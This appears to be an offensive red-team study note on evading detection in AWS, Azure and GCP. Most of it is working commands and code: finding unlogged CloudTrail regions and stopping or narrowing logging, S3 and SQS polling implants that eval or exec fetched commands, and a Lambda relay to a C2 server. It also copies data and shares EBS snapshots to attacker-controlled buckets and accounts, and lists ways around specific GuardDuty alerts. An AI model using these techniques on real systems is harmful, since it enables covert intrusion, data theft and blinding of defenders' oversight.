# 09.3 — Cloud Defence Evasion and Log Manipulation

## What This Note Covers

How attackers avoid detection in cloud environments — CloudTrail blind spots, log manipulation, living off the land with native cloud services, minimising API call noise, and what detection looks like so you can understand what you're evading.

---

## The Cloud Detection Landscape

Before evading, understand what defenders can see:

```
AWS Detection Sources:
  CloudTrail      → API calls (management events by default)
  CloudWatch Logs → Application and service logs
  VPC Flow Logs   → Network traffic metadata
  GuardDuty       → Threat intelligence + behaviour analytics
  Security Hub    → Aggregated findings
  S3 Access Logs  → Bucket access (if enabled)
  CloudTrail Data Events → S3 object-level access (if enabled)

Azure Detection Sources:
  Azure Monitor / Activity Log → Management plane API calls
  Microsoft Defender for Cloud → Threat detection
  Azure Sentinel (SIEM)        → SIEM correlation
  NSG Flow Logs                → Network traffic
  Key Vault Audit Logs         → Vault access
  Azure AD Sign-in Logs        → Authentication events

GCP Detection Sources:
  Cloud Audit Logs → Admin Activity, Data Access, System Event
  Security Command Center → Threat findings
  VPC Flow Logs    → Network traffic
  Cloud Monitoring → Metrics and alerting
```

## CloudTrail Evasion — AWS

### Technique 1: Identify and Use Unmonitored Regions

```bash
# Enumerate which regions have CloudTrail trails
aws cloudtrail describe-trails --include-shadow-trails \
  --query 'trailList[].{Name:Name,Region:HomeRegion,MultiRegion:IsMultiRegionTrail,Logging:IsLogging}'

# If IsMultiRegionTrail is false for all trails:
# Some regions have NO logging → operate there

# Find which regions are NOT covered by any trail
ALL_REGIONS=$(aws ec2 describe-regions --query 'Regions[].RegionName' --output text | tr '\t' '\n')
TRAILED_REGIONS=$(aws cloudtrail describe-trails \
  --query 'trailList[].HomeRegion' --output text | tr '\t' '\n')

# Regions with no trail
comm -23 <(echo "$ALL_REGIONS" | sort) <(echo "$TRAILED_REGIONS" | sort)
# These regions have no CloudTrail logging → safe to operate in
```

### Technique 2: Use Read-Only APIs (Low Alert Risk)

Read-only operations (`list*`, `describe*`, `get*`) are less likely to trigger alerts than write operations. Do as much recon as possible before taking any action.

```bash
# Low-noise enumeration operations:
aws iam list-users                    # logged but rarely alerted
aws iam list-roles                    # logged but rarely alerted
aws s3 ls                             # logged but rarely alerted
aws ec2 describe-instances            # logged but rarely alerted
aws lambda list-functions             # logged but rarely alerted
aws secretsmanager list-secrets       # logged, occasionally alerted

# High-noise operations that trigger alerts in mature SOCs:
aws iam create-user                   # HIGH ALERT
aws iam create-access-key             # HIGH ALERT
aws iam attach-user-policy            # HIGH ALERT (especially AdministratorAccess)
aws cloudtrail stop-logging           # IMMEDIATE ALERT
aws ec2 run-instances                 # MEDIUM ALERT (depends on environment)
```

### Technique 3: Stop or Modify CloudTrail (High Risk — Use Only in Testing)

```bash
# Stop CloudTrail logging (IMMEDIATELY LOGGED — then stops logging)
# The StopLogging event is itself logged before logging stops
aws cloudtrail stop-logging --name TRAIL_NAME

# More subtle: reduce what's logged via event selectors
aws cloudtrail put-event-selectors \
  --trail-name TRAIL_NAME \
  --event-selectors '[{
    "ReadWriteType": "ReadOnly",
    "IncludeManagementEvents": false,
    "DataResources": []
  }]'
# This reduces logging but generates an UpdateTrail event

# Delete the trail (most destructive — obvious)
aws cloudtrail delete-trail --name TRAIL_NAME
```

> [!danger] Never disable CloudTrail in a real client engagement
> Disabling CloudTrail in a production environment can cause compliance violations and hide real malicious activity from the client's security team. In pentesting, never disable logging. Demonstrate the technique in documentation only.

### Technique 4: Use Services That Don't Generate Management Events

Some AWS service interactions don't appear in CloudTrail management events:

```bash
# These activities have reduced CloudTrail visibility:
# - S3 data events (GetObject, PutObject) — only logged if data events enabled
# - Lambda function invocation payloads — not logged (only metadata)
# - DynamoDB item-level operations — only logged if data events enabled
# - SQS message content — not logged
# - EC2 instance userdata content reads — not logged
# - SSM Session Manager commands — only logged if SSM logging enabled

# Example: exfiltrate data via S3 without triggering management event alerts
aws s3 cp sensitive-data.txt s3://attacker-bucket/  # data event only
# If data events aren't enabled on the source bucket → no CloudTrail entry
```

## Azure Evasion Techniques

### Identify Monitoring Gaps

```bash
# Check if Azure Monitor Diagnostic Settings are configured
az monitor diagnostic-settings list --resource RESOURCE_ID

# Check Activity Log retention
az monitor activity-log list --max-events 5  # see what's actually being logged

# Check if Microsoft Defender for Cloud is active
az security pricing list --output table
# Free tier = limited detection; Standard tier = full detection

# Check if Azure Sentinel is deployed
az resource list --resource-type "Microsoft.OperationalInsights/workspaces" --output table
# If no Sentinel workspace → no SIEM correlation
```

### Low-Profile Azure Operations

```bash
# Reading operations that generate minimal alerts:
az ad user list              # Azure AD audit log (rarely alerted)
az role assignment list      # Activity log (rarely alerted)
az keyvault secret list      # Key Vault access log (if audit enabled)

# Higher-visibility operations:
az ad app credential reset   # Azure AD audit: "Add application credentials" — high alert
az role assignment create    # Activity log: high alert if Owner/Contributor
az ad user create            # Azure AD audit: "Add user" — high alert

# Use Graph API directly instead of az CLI — same logging but may blend better
TOKEN="eyJ..."
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/users" > /dev/null
```

## GCP Evasion Techniques

### Cloud Audit Log Gaps

```bash
# Check which audit log types are enabled
gcloud projects get-iam-policy PROJECT_ID \
  --format=json | python3 -c "
import sys, json
policy = json.load(sys.stdin)
for b in policy.get('auditConfigs', []):
    print(b.get('service'), b.get('auditLogConfigs', []))
"

# GCP has three audit log types:
# Admin Activity  → ALWAYS on (cannot be disabled)
# Data Access     → OFF by default (must be enabled)
# System Event    → ALWAYS on (cannot be disabled)

# Data Access logs capture:
# - GCS object reads/writes (if enabled)
# - BigQuery queries (if enabled)
# - Firestore reads (if enabled)
# If Data Access logging is OFF → reads to sensitive data aren't logged

# Operate in Data Access log gaps:
# GCS bucket reads → not logged unless bucket-level audit enabled
gsutil cat gs://BUCKET/sensitive-file.txt  # silent if Data Access logs off
```

## Living Off the Land in Cloud Environments

Using legitimate cloud services for C2 and exfiltration avoids custom C2 infrastructure that might be blocked or detected.

### S3 as C2 Channel

```bash
# C2 via S3 polling (attacker writes commands, victim reads and executes)

# Attacker side — write command to S3
aws s3 cp command.txt s3://legitimate-looking-bucket/cmd/latest.txt \
  --profile attacker

# Victim side (implant code) — poll S3 for commands
while true; do
  CMD=$(aws s3 cp s3://legitimate-looking-bucket/cmd/latest.txt - 2>/dev/null)
  [ -n "$CMD" ] && eval "$CMD" && \
    aws s3 rm s3://legitimate-looking-bucket/cmd/latest.txt
  sleep 60
done

# Traffic: S3 API calls to amazonaws.com — blends with normal AWS traffic
# No custom C2 domain needed
```

### SQS/SNS as C2

```bash
# Send commands via SQS (legitimate AWS service — commonly allowed in egress)
aws sqs send-message \
  --queue-url https://sqs.REGION.amazonaws.com/ACCOUNT/system-events \
  --message-body '{"action": "exec", "cmd": "id"}'

# Victim implant polls queue
aws sqs receive-message \
  --queue-url QUEUE_URL \
  --query 'Messages[0].Body' | python3 -c "import sys,json; d=json.loads(sys.stdin.read()); exec(d['cmd'])"
```

### Cloud Functions as C2 Relay

```python
# A Cloud Function / Lambda that proxies C2 traffic
# Traffic appears as calls to legitimate cloud service endpoints

import requests

def handler(event, context):
    # Forward request to actual C2
    response = requests.post(
        "https://ACTUAL_C2_SERVER/",
        data=event.get('body', ''),
        headers={'X-Custom-Header': event.get('headers', {}).get('X-Token', '')}
    )
    return {
        'statusCode': 200,
        'body': response.text
    }

# Victim calls Lambda endpoint → Lambda calls actual C2 → response returned
# Defenders see traffic to execute-api.amazonaws.com — not to attacker's server
```

## Snapshot and AMI Exfiltration

Exfiltrating data via cloud-native copy operations that look like infrastructure maintenance.

```bash
# AWS: Copy EBS snapshot cross-account
aws ec2 create-snapshot \
  --volume-id vol-TARGET_PRODUCTION \
  --description "maintenance-backup-$(date +%Y%m%d)"

# Share the snapshot with attacker's account
aws ec2 modify-snapshot-attribute \
  --snapshot-id snap-NEWSNAP \
  --attribute createVolumePermission \
  --operation-type add \
  --user-ids ATTACKER_ACCOUNT_ID

# From attacker's account — copy to attacker's region
aws ec2 copy-snapshot \
  --source-region us-east-1 \
  --source-snapshot-id snap-NEWSNAP \
  --region eu-west-1 \
  --profile attacker-account

# Mount and read the full disk image
# Result: entire EBS volume contents exfiltrated as an AMI copy operation
```

## What Detection Looks Like (Defender Perspective)

Understanding what defenders see helps red teams avoid triggering alerts:

```
GuardDuty finding: UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration
→ Triggered when: EC2 instance credentials used from an IP outside AWS
→ Evasion: Use the credentials from within AWS (another EC2 or Lambda)

GuardDuty finding: Recon:IAMUser/UserPermissions
→ Triggered when: Many IAM API calls from a single identity in short time
→ Evasion: Space out enumeration calls, use jitter/delays

GuardDuty finding: PrivilegeEscalation:IAMUser/AdministrativePermissions
→ Triggered when: IAM policies attached indicating escalation to admin
→ Evasion: Use subtler escalation paths (CreatePolicyVersion, trust policy update)

Azure Defender alert: Unusual number of resources were accessed
→ Triggered when: Identity accesses far more resources than normal behaviour
→ Evasion: Operate slowly, blend access patterns with normal behaviour

GCP Security Command Center: Anomalous IAM grant
→ Triggered when: Unusual IAM binding created (especially org-level)
→ Evasion: Use existing role bindings rather than creating new ones
```
